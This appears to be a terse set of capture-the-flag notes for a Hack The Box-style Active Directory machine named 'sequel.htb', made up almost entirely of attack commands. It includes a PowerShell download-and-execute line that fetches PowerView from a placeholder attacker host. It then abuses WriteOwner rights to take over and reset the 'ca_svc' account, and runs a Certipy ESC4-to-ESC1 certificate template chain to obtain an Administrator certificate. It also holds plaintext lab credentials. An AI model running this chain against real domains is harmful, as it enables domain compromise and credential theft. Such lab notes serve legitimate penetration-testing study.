# WriteOwner
```bash
powershell -ep bypass

IEX(New-Object Net.WebClient).downloadString("http://ATTACKER-IP/PowerView.ps1")

Set-DomainObjectOwner -Identity 'ca_svc' -OwnerIdentity 'ryan'

Add-DomainObjectAcl -Rights 'All' -TargetIdentity "ca_svc" -PrincipalIdentity "ryan"

net rpc password "ca_svc" "Password123" -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "dc01.sequel.htb"
```

# ESC4 exploit path
```bash

certipy-ad find -vulnerable -dc-ip '10.10.11.51' -u 'ca_svc' -p 'Password123' -stdout

# Make template vuln to ESC1
certipy-ad template -username 'ca_svc@sequel.htb' -password 'Password123' -template DunderMifflinAuthentication -save-old

# Exploit ESC1
certipy-ad req -username 'ca_svc@sequel.htb' -password 'Password123' -ca 'sequel-DC01-CA' -target 'dc01.sequel.htb' -template 'DunderMifflinAuthentication' -upn 'Administrator@sequel.htb' -dns 'dc01.sequel.htb'

# Restore config
certipy-ad template -username 'ca_svc@sequel.htb' -password 'Password123' -template ESC4-Test -configuration ESC4-Test.json

certipy auth -pfx ADMIN.PFS -dc-ip 10.10.11.51
```

